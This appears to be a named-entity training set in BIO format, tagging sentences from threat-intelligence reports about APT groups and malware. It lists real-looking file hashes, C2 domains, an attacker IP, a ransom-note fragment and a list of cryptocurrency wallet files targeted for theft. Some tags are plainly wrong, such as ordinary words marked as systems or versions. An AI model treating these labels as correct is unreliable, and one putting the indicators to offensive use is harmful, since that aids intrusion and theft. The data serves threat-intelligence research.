
Lists	O
of	O
passive	O
DNS	O
entries	O
for	O
horizons-tourisme.com	B-Indicator
and	O
gezelimmi.com	B-Indicator
can	O
be	O
found	O
below	O
.	O

Cursory	B-System
online	O
searches	O
failed	O
to	O
disclose	O
what	O
,	O
if	O
anything	O
Cdto	O
might	O
be	O
associated	O
with	O
.	O

But	O
the	O
client	O
is	O
only	O
half	O
of	O
the	O
remote	O
access	O
tool	O
(	O
RAT	O
)	O
—and	O
not	O
likely	O
the	O
part	O
that	O
would	O
appear	O
on	O
a	O
targeted	O
network	O
.	O

By	O
performing	O
manual	O
and	O
programmatic	O
analysis	O
of	O
sandbox	O
data	O
in	O
conjunction	O
with	O
identifying	O
behaviors	O
which	O
are	O
associated	O
with	O
malicious	O
activity	O
,	O
even	O
unknown	O
APT	B-Malware
campaigns	O
can	O
be	O
neutralized	O
.	O

This	O
is	O
not	O
significant	O
for	O
this	O
exploit	O
since	O
it	O
returns	O
true	O
for	O
any	O
version	O
between	O
and	O
including	O
Windows	B-System
XP	O
to	O
Windows	B-System
10	O
.	O

The	O
code	O
that	O
triggers	O
the	O
vulnerability	O
parses	O
this	O
structure	O
and	O
,	O
for	O
every	O
key	O
and	O
value	O
members	O
,	O
tries	O
to	O
get	O
the	O
respective	O
string	O
object	O
from	O
string	O
constant	O
pool	O
.	O

Figure	O
16	O
.	O

The	O
module	O
's	O
sending	O
routine	O
depends	O
on	O
the	O
following	O
files	O
in	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O

The	O
human	O
and	O
systemic	O
weaknesses	O
that	O
allow	O
an	O
attacker	O
to	O
compromise	O
an	O
organization	O
can	O
be	O
minimized	O
and	O
mitigated	O
with	O
correct	O
practices	O
and	O
solutions	O
.	O

Understanding	O
the	O
contents	O
of	O
China	B-Malware
Chopper	I-Malware
and	O
what	O
its	O
traffic	O
looks	O
like	O
allows	O
researchers	O
to	O
detect	O
this	O
pest	O
both	O
at	O
the	O
network	O
and	O
the	O
host	O
level	O
.	O

Botnet	O
at	O
large	O
:	O
Avast	O
blocks	O
Smominru	O
miner	O

checkFMServer	O
:	O
]	O

Regardless	O
of	O
sophistication	O
,	O
these	O
threats	O
may	O
support	O
future	O
belligerents	O
who	O
have	O
or	O
will	O
eventually	O
possess	O
the	O
capability	O
and	O
intent	O
to	O
disrupt	O
critical	O
business	O
operations	O
.	O

Finally	O
,	O
delete	O
the	O
temporary	O
file	O
%	O
windir%\Temp\temp.bin	O
.	O

Company/Project/Organization	O
Postion	O
Time	O

The	O
URL	O
is	O
similar	O
to	O
that	O
noted	O
in	O
the	O
BadCyber	O
blog	O
,	O
and	O
the	O
use	O
of	O
an	O
XAP	O
file	O
matches	O
what	O
can	O
be	O
found	O
in	O
the	O
Archive.org	O
cache	O
for	O
the	O
sap.misapor[.]ch	O
site	O
.	O

Web	O
.	O

Hypothesis	O
4	O
:	O
A	O
rogue	O
Tranchulas	O
employee	O
used	O
company	O
resources	O
without	O
company	O
knowledge	O
to	O
develop	O
the	O
malware	O
,	O
where	O
an	O
unknown	O
operator	O
later	O
used	O
it	O
offensively	O
.	O

[	O
그림	O
15	O
]	O
Phandoor의	B-Malware
특징적인	O
문자열	O
(	O
S^	O
)	O
Phandoor가	B-Malware
실행되면	O
초기화를	O
거쳐	O
C	O
&	O
C	O
서버에	O
접속을	O
시도한다	O
.	O

Function	O
MainCommsLoop_sub_493A30	B-Indicator
(	O
)	O

You	O
have	O
'	O
UNIQUE_ID_DO_NOT_REMOVE	O
'	O
file	O
on	O
your	O
desktop	O
also	O
it	O
duplicated	O
in	O
some	O
folders	O
,	O
its	O
your	O
unique	O
idkey	O
,	O
attach	O
it	O
to	O
letter	O
when	O
contact	O
with	O
us	O
.	O

RAT	B-Malware
component	O

Figure	O
18	O
:	O
Results	O
of	O
multiple	O
AV	O
engine	O
inspections	O
showing	O
the	O
Web	B-Malware
shell	O
comes	O
up	O
clean	O

One	O
specific	O
Cmstar	O
payload	O
that	O
we	O
analyzed	O
used	O
the	O
character/offsets	O
seen	O
in	O
Figure	O
1	O
to	O
locate	O
the	O
API	O
functions	O
within	O
three	O
different	O
Windows	B-System
libraries	O
to	O
build	O
its	O
IAT	O
.	O

InitialCommands	O
:	O
78537844	O
...	O
[	O
]	O
...	O
000000	O
BYTES	O

As	O
shown	O
in	O
Figure	O
23	O
,	O
the	O
client	O
initiates	O
the	O
connection	O
over	O
TCP	O
port	O
80	O
using	O
the	O
HTTP	O
POST	O
method	O
.	O

028caf3b1f5174ae092ecf435c1fccc2	B-Indicator
7732d5349a0cfa1c3e4bcfa0c06949e4	B-Indicator
9909f8558209449348a817f297429a48	B-Indicator
63698ddbdff5be7d5a7ba7f31d0d592c	B-Indicator
7c4e60685203b229a41ae65eba1a0e10	B-Indicator
e2112439121f8ba9164668f54ca1c6af	B-Indicator
784b6e13f195236304e1c172dcdab51f	B-Indicator
b0f0350a5c2480d8419d14ec3445b765	B-Indicator
9a51db9889d4fd6d02bdb35bd13fb07e	B-Indicator
8199667bad5559ee8f04fd6b1a587a75	B-Indicator
7ad6aaa107a7616a3dbe8e3babf5d310	B-Indicator

The	O
cybercriminals	O
behind	O
the	O
Tempting	B-Malware
Cedar	I-Malware
Spyware	I-Malware
were	O
able	O
to	O
install	O
a	O
persistent	O
piece	O
of	O
spyware	O
by	O
exploiting	O
social	O
media	O
,	O
like	O
Facebook	O
,	O
and	O
people	O
's	O
lack	O
of	O
security	O
awareness	O
,	O
and	O
were	O
thus	O
able	O
to	O
gather	O
sensitive	O
and	O
private	O
data	O
from	O
their	O
victims	O
'	O
phones	O
including	O
real-time	O
location	O
data	O
which	O
makes	O
the	O
malware	O
exceptionally	O
dangerous	O
.	O

A	O
document	O
purporting	O
to	O
be	O
from	O
the	O
Institute	O
for	O
Development	O
and	O
Research	O
in	O
Banking	O
Technology	O
(	O
established	O
by	O
the	O
Reserve	O
Bank	O
of	O
India	O
)	O
is	O
shown	O
in	O
Figure	O
7	O
.	O

Symantec	B-Organization
,	O
the	O
Symantec	O
Logo	O
,	O
and	O
the	O
Checkmark	O
Logo	O
are	O
trademarks	O
or	O
registered	O
trademarks	O
of	O
Symantec	O
Corporation	O
or	O
its	O
affiliates	O
in	O
the	O
U.S.	O
and	O
other	O
countries	O
.	O

The	O
screenshot	O
below	O
is	O
indicative	O
of	O
typical	O
message	O
content	O
:	O
The	O
attachments	O
to	O
the	O
e-mails	O
we	O
have	O
been	O
able	O
to	O
analyze	O
were	O
typically	O
.rar	O
files	O
,	O
which	O
we	O
found	O
to	O
contain	O
malware	O
.	O

ASN	O
and	O
Hosting	O
provider	O

7b4a8be258ecb191c4c519d7c486ed8a	B-Indicator
)	O
is	O
identical	O
to	O
the	O
one	O
reported	O
in	O
a	O
malware	O
traffic	O
analysis	O
blog	O
post	O
from	O
March	O
2016	O
where	O
it	O
was	O
used	O
to	O
deliver	O
Qbot	O
.	O

The	O
files	O
found	O
are	O
packed	O
in	O
an	O
archive	O
,	O
which	O
is	O
then	O
scheduled	O
for	O
upload	O
to	O
the	O
C	O
&	O
C	O
using	O
the	O
FMGR	O
module	O
.	O

https://twitter.com/MoayyadAyesh	B-Indicator
https://www.facebook.com/profile.php?id=100012034095150	B-Indicator

However	O
,	O
it	O
seems	O
like	O
the	O
malware	O
authors	O
underestimated	O
the	O
spreading	O
capabilities	O
of	O
Diskcoder.C	O
.	O

The	O
Guardian	O
.	O

The	O
group	O
's	O
campaigns	O
appear	O
to	O
have	O
been	O
active	O
since	O
at	O
least	O
2005	O
,	O
while	O
the	O
very	O
first	O
sample	O
found	O
points	O
to	O
2001	O
.	O

Vulnerability	O
Spotlight	O
:	O
Multiple	O
Adobe	B-Organization
Acrobat	B-System
DC	O
...	O
Threat	O
Roundup	O
for	O
June	O
29	O
to	O
July	O
Smoking	O
Guns	O
-	O
Smoke	O
Loader	O
learned	O
new	O
tricks	O
(	O
15	O
)	O
(	O
15	O
)	O
(	O
21	O
)	O
(	O
10	O
)	O
(	O
14	O
)	O
(	O
18	O
)	O
(	O
172	O
)	O
(	O
98	O
)	O
(	O
62	O
)	O
(	O
67	O
)	O
(	O
30	O
)	O
(	O
53	O
)	O
(	O
23	O
)	O
(	O
93	O
)	O
(	O
146	O
)	O
(	O
37	O
)	O

At	O
least	O
one	O
targeted	O
individual	O
activated	O
links	O
to	O
malware	O
hosted	O
on	O
operational	O
infrastructure	O
of	O
opened	O
attachments	O
containing	O
malware	O
.	O

The	O
other	O
functions	O
return	O
hardcoded	O
values	O
that	O
serve	O
no	O
real	O
purpose	O
.	O

Какая	O
реформа	O
армии	O
нужна	O
Украине	O
.doc	O
(	O
What	O
is	O
needed	O
reform	O
of	O
the	O
army	O
Ukraine.doc	O
)	O
MD5	O
:	O
76ffb9c2d8d0ae46e8ea792ffacc8018	B-Indicator
SHA256	O
:	O
c26c67eac20614038aaadfda19b604862926433333893d65332928b5e36796aa	B-Indicator
Type	O
:	O
MIME	O
entity	O
text	O
Toolkit	O
:	O
MNKit	O
Author	O
:	O
User123	O
Last	O
Saved	O
By	O
:	O
User123	O
Created	O
:	O
2012-05-01T14:08:00Z	O
Modified	O
:	O
2012-05-01T14:12:00Z	O
запуск	O
ракеты	O
-	O
носителя	O
Союз	O
.doc	O
(	O
launch	O
of	O
the	O
carrier	O
rocket	O
Soyuz.doc	O
)	O
MD5	O
:	O
6fdeadacfe1dafd2293ce5c4e178b668	B-Indicator
SHA256	O
:	O
e39b0e777ef0135c1f737b67988df70c2e6303c3d2b01d3cdea3efc1d03d9ad9	B-Indicator
сельское	O
_	O
хозяйство	O
.doc	O
(	O
RF	O
China	O
Agriculture	O
and	O
Economy.doc	O
)	O
MD5	O
:	O
9da10a36daf845367e0fc2f3e7e54336	B-Indicator
SHA256	O
:	O
a0aeb172a72442d2c2c02e1d32b48accb9975c4da7742df24d9350a8ccd401f2	B-Indicator
Ерөнхий	O
сайд	O
асан	O
Н.Алтанхуягийг	O
шалгаж	O
эхэлжээ	O
.doc	O
(	O
Former	O
Prime	O
Minister	O
started	O
to	O
check	O
with	O
their	O
lethargy.doc	O
)	O
MD5	O
:	O
f7d47e1de4f5f4ad530bca0fc080ea53	B-Indicator
SHA256	O
:	O
4883286b8229a2c43db17eb1e1c5bd79d1933e840cdfedff80d5b99a84c9e39f	B-Indicator
запуск	O
ракеты	O
-	O
носителя	O
Союз	O
.doc	O
(	O
launch	O
of	O
the	O
carrier	O
rocket	O
Soyuz.doc	O
)	O
MD5	O
:	O
6fdeadacfe1dafd2293ce5c4e178b668	B-Indicator
SHA256	O
:	O
e39b0e777ef0135c1f737b67988df70c2e6303c3d2b01d3cdea3efc1d03d9ad9	B-Indicator
MD5	O
:	O
5aeb8a5aa8f6e2408016cbd13b3dfaf0	B-Indicator
SHA256	O
:	O
df34aa9c8021f1f0bdf33249908efc4a9628941453ad79b281b3a46bf9a7f37f	B-Indicator
Путины	O
урилга	O
.doc	O
(	O
Putin	O
's	O
invitation.doc	O
)	O
SHA256	O
:	O
45027d11ab783993c413f97e8e29759d04b04564f8916f005f5c632f291697bb	B-Indicator
MD5	O
:	O
46bf922d9ae07a9bc3667a374605bdbb	B-Indicator
SHA256	O
:	O
7dc78caf515d1d3d2b84be7c023ccbd0b4fd670a42babcbcbd5a5ba65bbdd166	B-Indicator
Армия	O
-2015.doc	O
(	O
Army-2015.doc	O
)	O
MD5	O
:	O
783a423f5e285269126d0d98f53c795b	B-Indicator
SHA256	O
:	O
5b338decffe665a2141d1079c32b2d612057d1fdbfddf198cc28003dae7f0516	B-Indicator
днём	O
70	O
лет	O
победы	O
.doc	O
(	O
Happy	O
70	O
years	O
of	O
victory.doc	O
)	O
MD5	O
:	O
510b3272342765743a202373261c08da	B-Indicator
SHA256	O
:	O
0a10d7bb317dceccd05d18408fd6b8b12c784910e5f7e035ee22c2c5d7e4cbf5	B-Indicator
Filename	O
:	O
new	O
resume.doc	O
MD5	O
:	O
c5ae7bd6aec1e01aa53edcf41962ac04	B-Indicator
SHA256	O
:	O
87bcc6d18c6a81d92d826b232703dee84b522bd1d0cae56f74bcf58fdca0930e	B-Indicator
MD5	O
:	O
3d41e3c902502c8b0ea30f5947307d56	B-Indicator
SHA256	O
:	O
b65dd4da9f83c11fcb5beaec43fabd0df0f7cb61de94d874f969ca926e085515	B-Indicator
Центр	O
-2015.doc	O
(	O
Center-2015.doc	O
)	O
MD5	O
:	O
94499ff857451ab7ef8823bf067189e7	B-Indicator
SHA256	O
:	O
671dfc4d47a43cf0bd9205a0f654dcd5050175aef54b69388b0c5f4610896c6a	B-Indicator
Related	O
Cmwhite	B-Malware
Tools	O
MD5	O
:	O
3fff0bf6847d0d056636caef9c3056c3	B-Indicator
SHA256	O
:	O
13c1d7eb2fd64591e224dec9534d8252f4b91e425e8f047b36605138d15cbf2d	B-Indicator
C2	O
:	O
stone.timmf.com	B-Indicator
MD5	O
:	O
30a6c3c7723fe14c4b6960fa3e4e57ba	B-Indicator
SHA256	O
:	O
ab934c6177be0fdc3b6dfbf21f60ce7837a30e6599dcfb111b43008c75ceb91f	B-Indicator
C2	O
:	O
xphome.mailru-vip.com	B-Indicator
C2	O
:	O
error.yandex-pro.com	B-Indicator
MD5	O
:	O
e0417547ba54b58bb2c8f795bca0345c	B-Indicator
SHA256	O
:	O
1cf44815f9eb735e095f68c929d5549e0ebc44af9988cccaf1852baeb96bb386	B-Indicator
C2	O
:	O
dns.thinkttun.com	B-Indicator
MD5	O
:	O
d05f012c9c1a7fb669a07070be821072	B-Indicator
SHA256	O
:	O
a37f337d0bc3cebede2039b0a3bd5afd0624e181d2dcc9614d2f7d816b5a7a6b	B-Indicator
C2	O
:	O
help.redhag.com	B-Indicator
C2	O
:	O
mssage.hotoicq.com	B-Indicator
C2	O
:	O
new.hoticq.com	B-Indicator

The	O
attackers	O
have	O
been	O
using	O
IP	O
address	O
192.52.167.118	B-Indicator
since	O
the	O
beginning	O
of	O
January	O
.	O

It	O
was	O
padded	O
with	O
unnecessary	O
null	O
bytes	O
in	O
the	O
overlay	O
section	O
of	O
the	O
file	O
,	O
in	O
order	O
to	O
increase	O
the	O
file	O
size	O
as	O
shown	O
in	O
Figure	O
7	O
.	O

determines	O
if	O
it	O
has	O
access	O
to	O
a	O
file	O
;	O
may	O
be	O
a	O
temp	O
file	O
creation/rename	O
involved	O
collects	O
system	O
related	O
and	O
possibly	O
network	O
related	O
information	O
such	O
as	O
,	O
domains	O
,	O
system	O
information	O
creates	O
a	O
directory	O
closes	O
a	O
file	O
that	O
was	O
opened	O
for	O
writing	O
sets	O
normal	O
attributes	O
on	O
a	O
targeted	O
file	O
,	O
deletes	O
the	O
file	O
,	O
opens	O
the	O
same	O
file	O
name	O
as	O
a	O
binary	O
file	O

After	O
the	O
packet	O
flag	O
,	O
packet	O
length	O
and	O
unzip	O
length	O
have	O
been	O
verified	O
,	O
a	O
working	O
connection	O
is	O
created	O
between	O
the	O
victim	O
and	O
the	O
controller	O
.	O

The	O
spyware	O
persisted	O
as	O
a	O
service	O
and	O
ran	O
after	O
every	O
reboot	O
.	O

2010	O
Different	O
17.10	B-Version
.	O

InjectApp	O
sendEventToPid	O
:	O
]	O

The	O
timeline	O
below	O
outlines	O
the	O
events	O
specific	O
to	O
Mutter	B-Malware
that	O
we	O
had	O
visibility	O
into	O
.	O

Linking	O
APTs	B-Malware
from	O
2011	O
and	O
2014	O
to	O
an	O
Active	O
Scam	O
Network	O
–	O
Kiel	O
Wadner	O
–	O
https://www.bluecoat.com/security-blog/2014-10-08/linking-apts-2011-and-2014-active-scam-network	B-Indicator

windows	B-System
windows	O
8	O
wordpress	O
worm	O
youtube	O
zero	O
day	O
zeus	O
zynga	O
404	B-Version

This	O
previously	O
unseen	O
variant	O
of	O
X-Agent	B-Malware
represents	O
FANCY	O
BEAR	O
's	O
expansion	O
in	O
mobile	O
malware	O
development	O
from	O
iOS-capable	O
implants	O
to	O
Android	O
devices	O
,	O
and	O
reveals	O
one	O
more	O
component	O
of	O
the	O
broad	O
spectrum	O
approach	O
to	O
cyber	O
operations	O
taken	O
by	O
Russia-based	O
actors	O
in	O
the	O
war	O
in	O
Ukraine	O
.	O

TG-4127	B-Malware
exploited	O
the	O
Hillary	O
for	O
America	O
campaign	O
's	O
use	O
of	O
Gmail	O
and	O
leveraged	O
campaign	O
employees	O
'	O
expectation	O
of	O
the	O
standard	O
Gmail	O
login	O
page	O
to	O
access	O
their	O
email	O
account	O
.	O

Author	O
:	O
Ivona	O
Alexandra	O
Chili	O
–	O
Forensics	O
Engineer	O
,	O
Cyber	O
Threat	O
Intelligence	O
Lab	O

Until	O
2015	O
,	O
Lazarus	O
Group	O
cyber	O
activities	O
primarily	O
focused	O
on	O
South	O
Korean	O
and	O
U.S.	O
governments	O
and	O
financial	O
organizations	O
,	O
including	O
destructive	O
attacks	O
on	O
South	O
Korean	O
banking	O
and	O
media	O
sectors	O
in	O
2013	O
and	O
the	O
highly	O
publicized	O
attack	O
on	O
Sony	O
Pictures	O
Entertainment	O
in	O
2014	O
.	O

The	O
final	O
5-byte	O
sequence	O
looks	O
like	O
F3	O
00	B-Version
00	O
00	O
92	O
0D	B-Version
.	O

Investigators	O
indicated	O
that	O
the	O
actors	O
may	O
have	O
gained	O
access	O
to	O
DCCC	O
systems	O
as	O
early	O
as	O
March	O
.	O

Hardcoded	O
control	O
server	O
URLs	O
.	O

Eleven	O
days	O
after	O
we	O
publicly	O
published	O
'	O
Operation	O
DustySky	B-Malware
'	O
,	O
we	O
received	O
the	O
following	O
email	O

'	O
Pawn	O
Storm	O
's	O
Domestic	O
Spying	O
Campaign	O
Revealed	O
;	O
Ukraine	O
and	O
US	O
Top	O
Global	O
Targets	O
.	O
'	O

MyS	O
|	O
0000d720	B-Version
65	O
74	O
74	O
69	O
6e	B-Version
67	O
73	O
00	O
53	O
68	O
61	O
64	O
6f	B-Version
77	O
54	O
65	O
|	O
ettings.ShadowTe	O
|	O
0000d730	B-Version
63	O
68	O
5f	B-Version
52	O
61	O
74	O
2e	B-Version
4d	B-Version
79	O
00	O
41	O
70	O
70	O
6c	B-Version
69	O
63	O
|	O
ch_Rat.My.Applic	O
|	O

Tisone360.com	O
,	O
Visits	O
,	O
and	O
Hacking	O
Team	O
Flash	O
0day	O

Targeting	O
:	O
Because	O
the	O
attacker	O
can	O
selectively	O
serve	O
exploits	O
to	O
the	O
victim	O
,	O
they	O
can	O
limit	O
the	O
attack	O
to	O
intended	O
victims	O
.	O

By	O
using	O
Threat	O
Intelligence	O
Platforms	O
and	O
Feeds	O
such	O
as	O
PassiveTotal	O
,	O
Cyberkov	O
was	O
able	O
to	O
discover	O
more	O
activities	O
and	O
campaigns	O
run	O
by	O
Libyan	B-Malware
Scorpions	I-Malware
.	O

China	B-Malware
Chopper	I-Malware
can	O
also	O
run	O
transparently	O
on	O
both	O
Windows	B-System
and	O
Linux	O
.	O

The	O
CEO	O
of	O
Tranchulas	O
is	O
Zubair	O
Khan	O
,	O
a	O
Pakistani	O
national	O
and	O
information	O
security	O
executive	O
who	O
has	O
'	O
been	O
researching	O
mainly	O
on	O
[	O
sic	O
]	O
cyber	O
warfare	O
'	O
.	O

FireEye	O
dubbed	O
this	O
new	O
malware	O
family	O
HIGHTIDE	B-Malware
.	O

6	O
Oct	O
.	O

Self-destructing	O
the	O
executable	O
.	O

During	O
analysis	O
,	O
we	O
observed	O
a	O
code	O
section	O
where	O
a	O
message	O
written	O
in	O
Chinese	O
and	O
hard	O
coded	O
in	O
the	O
script	O
will	O
be	O
printed	O
in	O
the	O
case	O
of	O
an	O
error	O
while	O
connecting	O
to	O
the	O
C2	O
server	O
:	O
The	O
English	O
translation	O
for	O
this	O
message	O
is	O
:	O
'	O
Can	O
not	O
connect	O
to	O
website	O
,	O
please	O
wait	O
for	O
dragon	O
'	O
.	O

This	O
section	O
contains	O
the	O
behavioral	O
analysis	O
of	O
the	O
dropped	O
executable	O
Once	O
the	O
dropped	O
file	O
(	O
officeupdate.exe	O
)	O
is	O
executed	O
the	O
malware	O
drops	O
additional	O
files	O
(	O
googleupdate.exe	O
,	O
malib.dll	O
and	O
msccvs.dll	O
)	O
into	O
the	O
%	O
AllUsersProfile	O
%	O
\Google	O
directory	O
and	O
then	O
executes	O
the	O
dropped	O
googleupdate.exe	O

The	O
path	O
move-to-operational	O
is	O
interesting	O
as	O
well	O
,	O
perhaps	O
implying	O
that	O
IRONGATE	B-Malware
was	O
not	O
seeking	O
the	O
actual	O
running	O
process	O
,	O
but	O
rather	O
a	O
staging	O
area	O
for	O
code	O
promotion	O
.	O

The	O
attackers	O
appeared	O
to	O
prefer	O
the	O
Google	B-Organization
URL	O
shortening	O
service	O
'	O
goog.gl	O
,	O
'	O
however	O
,	O
this	O
could	O
easily	O
change	O
as	O
the	O
attacks	O
evolve	O
.	O

SUMMARY	O
OF	O
KEY	O
FINDINGS	O

b803381535ac24ce7c8fdcf6155566d208dfca63fd66ec71bbc6754233e251f5	B-Indicator

The	O
three	O
primary	O
encryption	O
loops	O
are	O
colored	O
and	O
marked	O
in	O
Figure	O
1	O
.	O

Value	O
:	O
ServiceDLL	O

003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D9	B-Indicator
2015-02-17	B-Version
EQUATION	B-Malware
003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D9	B-Indicator
2015-02-17	B-Version
EQUATION	B-Malware
2014-12-20	B-Version
UNKNOWN	O
ARID	B-Malware
VIPER	I-Malware
2014-12-20	B-Version
ARID	B-Malware
VIPER	I-Malware
2015-01-02	B-Version
MALIICIOUS	O
ARID	B-Malware
VIPER	I-Malware
2015-01-16	O
ARID	B-Malware
VIPER	I-Malware
2015-02-12	O
ARID	B-Malware
VIPER	I-Malware

RtlGetVersion	O
,	O
KeAreAllApcsDisabled	O
,	O
PsGetProcessSessionId	O
,	O
PsGetProcessPeb	O
obtained	O
with	O
their	O
own	O
functions	O

Once	O
executing	O
,	O
the	O
payload	O
will	O
immediately	O
delete	O
the	O
fi	O
rst	O
service	O
and	O
enter	O
stage-two	O
.	O

int	O
nAddend	O
=	O
1000	O
;	O
int	O
nSuffix	O
=	O
-71	B-Version
;	O
int	O
nResult	O
=	O
nSuffix	O
+	O
nAddend	O
;	O
for	O
(	O
int	O
k=0	O
;	O
k	O
<	O
4	O
;	O
k++	O
)	O
nResult	O
+=	O
1	O
;	O
sprintf	O
(	O
suffix	O
,	O
'	O
%	O
d	O
'	O
,	O
--	O
nResult	O
)	O
;	O

The	O
key	O
for	O
decryption	O
is	O
hardcoded	O
in	O
the	O
malicious	O
samples	O
.	O

This	O
handle	O
value	O
is	O
invalid	O
:	O
all	O
the	O
windows	B-System
kernel	O
handle	O
values	O
are	O
by	O
design	O
a	O
multiple	O
of	O
4	O
.	O

–	O
Wallet.dat	O
–	O
UTC–	O
–	O
Etherenum	O
keystore	O
filename	O
–	O
*bitcoin*.txt	O
*.txt	O
–	O
'	O
Bitcoin	O
'	O
–	O
*monero*.txt	O
*.txt	O
–	O
'	O
Monroe	O
Coin	O
'	O
–	O
*litecoin*.txt	O
*.txt	O
–	O
'	O
Litecoin	O
'	O
–	O
*Ethereum*.txt	O
*.txt	O
–	O
'	O
Ethereum	O
'	O
–	O
*miner*.txt	O
*.txt	O
–	O
'	O
Mining	O
'	O
–	O
*blockchain*.txt	O
–	O
*coinbase*	O

When	O
sending	O
the	O
information	O
,	O
ANEL	B-Malware
encrypts	O
the	O
data	O
using	O
blowfish	O
,	O
XOR	O
,	O
and	O
Base64-based	O
encryption	O
methods	O
.	O

Among	O
these	O
shared	O
features	O
,	O
we	O
can	O
cite	O
the	O
following	O
:	O
At	O
the	O
very	O
beginning	O
of	O
Dino	B-Malware
execution	O
,	O
the	O
current	O
process	O
name	O
is	O
checked	O
against	O
process	O
names	O
used	O
by	O
some	O
sandboxes	O
:	O
A	O
very	O
similar	O
check	O
(	O
against	O
'	O
klavme	O
'	O
,	O
'	O
myapp	O
'	O
,	O
'	O
TESTAPP	O
'	O
and	O
'	O
afyjevmv.exe	O
'	O
)	O
is	O
present	O
in	O
Bunny	B-Malware
samples	O
,	O
and	O
in	O
some	O
first­stage	O
implants	O
deployed	O
by	O
Animal	O
Farm	O
.	O

Since	O
1979	O
,	O
Iran	O
's	O
reactions	O
to	O
perceived	O
Middle	O
Eastern	O
adversaries	O
'	O
foreign	O
policy	O
has	O
been	O
a	O
study	O
in	O
the	O
use	O
of	O
proxies	O
.	O

The	O
malware	O
in	O
this	O
attack	O
has	O
the	O
ability	O
to	O
replace	O
the	O
Master	O
Boot	O
Record	O
(	O
MBR	O
)	O
with	O
its	O
own	O
malicious	O
code	O
.	O

Analysis	O
While	O
the	O
analysis	O
below	O
discloses	O
the	O
capabilities	O
of	O
the	O
spotted	O
malware	O
,	O
we	O
are	O
pretty	O
sure	O
it	O
is	O
part	O
of	O
a	O
multi-staged	O
attack	O
that	O
targets	O
very	O
specific	O
victims	O
.	O

Even	O
when	O
their	O
campaign	O
was	O
exposed	O
,	O
the	O
attackers	O
did	O
not	O
give	O
up	O
.	O

As	O
you	O
can	O
see	O
from	O
the	O
diagram	O
,	O
it	O
is	O
not	O
known	O
which	O
malicious	O
program	O
interacted	O
with	O
the	O
following	O
three	O
drivers	O
:	O
rndismpc.sys	O
,	O
rtniczw.sys	O
and	O
jmidebs.sys	O
.	O

Code	O
execution	O
with	O
minimal	O
interaction	O
:	O
The	O
vulnerabilities	O
used	O
in	O
zero-day	O
exploits	O
typically	O
trigger	O
with	O
little	O
or	O
no	O
user	O
interaction	O
other	O
than	O
opening	O
the	O
document	O
.	O

dns.exe	O

The	O
attackers	O
identified	O
infected	O
machines	O
in	O
the	O
business	O
sector	O
and	O
followed	O
the	O
tracks	O
to	O
see	O
what	O
else	O
they	O
might	O
be	O
able	O
to	O
get	O
from	O
the	O
companies	O
.	O

GUID	O
:	O
12FEB4A9EEDEE411B283000C29FD2872	B-Version
BYTES	O

Comment	O
Name	O
*	O
Email	O
*	O
Please	O
enter	O
an	O
answer	O
in	O
digits	O
:	O
13	O
+	O
16	O
=	O
Close	O
Menu	O
Business	O
Consumer	B-System
Executive	O
Perspectives	O
McAfee	B-Organization
Partners	O
McAfee	B-Organization
Labs	O
Languages	O

The	O
U.S.	O
Government	O
is	O
referring	O
to	O
this	O
malicious	O
cyber	O
activity	O
by	O
RIS	O
as	O
GRIZZLY	O
STEPPE	O
.	O

In	O
the	O
resulting	O
data	O
after	O
NOT	O
operation	O
,	O
the	O
XOR	O
key	O
is	O
\x30\x30\x34\x31	B-Version
.	O

The	O
government	O
does	O
its	O
best	O
to	O
compartmentalize	O
—	O
one	O
job	O
might	O
be	O
creating	O
a	O
remote	O
code	O
exploit	O
(	O
RCE	O
)	O
for	O
a	O
popular	O
software	O
application	O
,	O
while	O
another	O
job	O
might	O
be	O
using	O
the	O
RCE	O
and	O
establishing	O
persistent	O
unauthorized	O
access	O
.	O

Exploit	O
Document	O
MD5	O
:	O

Number	O
of	O
object	O
files	O
,	O
Red	O
October	O
Fileputexec	O
plugin	O

Encryption	O
The	O
scrambled	O
byte	O
sequence	O
is	O
passed	O
onto	O
the	O
constructor	O
of	O
the	O
class	O
Packet	O
:	O
:Packet	O
,	O
which	O
creates	O
a	O
random	O
AES256	O
key	O
and	O
encrypts	O
the	O
buffer	O
with	O
this	O
key	O
.	O

Promotional	O
materials	O
have	O
been	O
leaked	O
that	O
describe	O
the	O
tools	O
as	O
providing	O
a	O
wide	O
range	O
of	O
intrusion	O
and	O
monitoring	O
capabilities	O
.	O

Certain	O
pages	O
within	O
the	O
domain	O
would	O
load	O
the	O
legitimate	O
Ynet	O
website	O
:	O
Others	O
,	O
which	O
are	O
opened	O
as	O
decoy	O
during	O
malware	O
infection	O
,	O
had	O
copied	O
content	O
from	O
a	O
different	O
news	O
site	O
:	O
The	O
URL	O
ynetnewes[.]com/video/Newfilm.html	B-Indicator
contained	O
an	O
article	O
about	O
Brad	O
Pitt	O
and	O
Marion	O
Cotillard	O
copied	O
from	O
another	O
site	O
.	O

It	O
is	O
noteworthy	O
that	O
in	O
most	O
of	O
the	O
cases	O
the	O
same	O
submitters	O
uploaded	O
samples	O
belonging	O

Developing	O
such	O
state-of-the-art	O
backdoors	O
requires	O
skillful	O
malware	O
authors	O
,	O
time	O
and	O
resources	O
.	O

We	O
also	O
believe	O
a	O
separate	O
third	O
group	O
is	O
using	O
these	O
TTPs	O
but	O
we	O
do	O
not	O
have	O
sufficient	O
insight	O
to	O
this	O
operator	O
at	O
this	O
time	O
.	O

An	O
example	O
of	O
this	O
hardening	O
can	O
be	O
seen	O
with	O
Google	B-Organization
's	O
Chrome	O
Browser	O
v.55	O
,	O
which	O
outright	O
blocks	O
Flash	O
by	O
default	O
.	O

As	O
we	O
have	O
seen	O
in	O
other	O
targeted	O
campaigns	O
,	O
social	O
engineering	O
and	O
carefully	O
crafted	O
spear­phishing	O
attacks	O
play	O
a	O
crucial	O
role	O
in	O
the	O
effectiveness	O
of	O
getting	O
a	O
foothold	O
in	O
the	O
desired	O
system	O
.	O

In	O
2014	O
,	O
APT32	B-Malware
leveraged	O
a	O
spear-phishing	O
attachment	O
titled	O
'	O
Plans	O
to	O
crackdown	O
on	O
protesters	O
at	O
the	O
Embassy	O
of	O
Vietnam.exe	O
,	O
'	O
which	O
targeted	O
dissident	O
activity	O
among	O
the	O
Vietnamese	O
diaspora	O
in	O
Southeast	O
Asia	O
.	O

case	O
't	O
'	O
:	O

Attackers	O
can	O
embed	O
malicious	O
VBScript	O
to	O
Office	O
document	O
or	O
website	O
and	O
then	O
obtain	O
the	O
credential	O
of	O
the	O
current	O
user	O
,	O
